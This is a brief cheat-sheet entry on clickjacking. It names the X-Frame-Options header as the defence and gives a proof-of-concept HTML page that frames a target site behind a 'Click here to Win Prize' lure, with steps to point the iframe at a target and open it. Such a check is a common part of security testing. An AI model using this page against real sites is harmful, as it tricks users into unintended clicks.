# ClickJacking

X-Frame-Options header to prevent

```
1. COPY and paste the below HTML code.


<!DOCTYPE html>
<html>
<head>
<title>Clickjacking PoC</title>
</head>
<body>
<input type=button value="Click here to Win Prize" style="z-index:-1;left:1200px;position:relative;top:800px;"/>
<iframe src="http://esmuat/" width=100% height=100% style=”opacity: 0.5;”></iframe>
</body>
</html>


2. Edite the src attribute of iframe tag. Change its url to your target site and save the file.
3. Launch the file in browser.

```

